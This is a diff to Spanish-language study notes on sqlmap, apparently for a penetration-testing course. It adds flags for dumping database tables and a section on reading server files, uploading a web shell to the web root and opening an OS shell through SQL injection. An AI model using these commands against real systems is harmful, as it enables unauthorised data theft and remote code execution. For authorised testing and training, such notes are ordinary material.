@@ -47,9 +47,9 @@ sqlmap -u "<url/ip>" --data "<POST data 1>*&<POST data 2>"
 #Dumpea todo
 -D <DBName>
 #Especificar nombre de la DB a dumpear
---tables -D x
+--tables -D x --dump
 #Dumpea las tables de la DB X
--D X -T <TableName>
+-D X -T <TableName> --dump
 #Especificar nombre de la tabla de la cual dumpear todo
 -D X -T Y -C a,b
 #Dumpea de la DB X y Tabla Y, las columnas a y b
@@ -77,3 +77,19 @@ sqlmap -u "<url/ip>" --data "<POST data 1>*&<POST data 2>"
 #Muy necesario para bypasear cualquier tipo de bloqueo mediante palabras. Permrmite modiificar la request de (por ej) UNION a 0eunion
 #Mas info: https://academy.hackthebox.com/module/58/section/530
 
+	### OS explotation
+## Enumeracion
+--is-dba
+#Permite verificar si tenemos Database admin privilege para escribir/leer archivos
+
+## Leer y escribir archivos
+--file-read "file"
+#En el caso de que dba sea true, se puede intentar leer archivos pasadole el path
+--file-write <"file a subir"> --file-dest <"path donde subimos">
+#Flags para subir un archivo X (shell.php) de nuestra maquina a una ubicacion Y (/var/www/html/shell.php) del target
+
+## Ejecucion de comandos
+--os-shell
+#Si bien podemos subir nuestra propia shell, SQLmap tiene la capacidad de crearla
+--technique=E
+#Sumado a la flag de la shell, esta tecnica puedo permitirnos no tener errores en el output
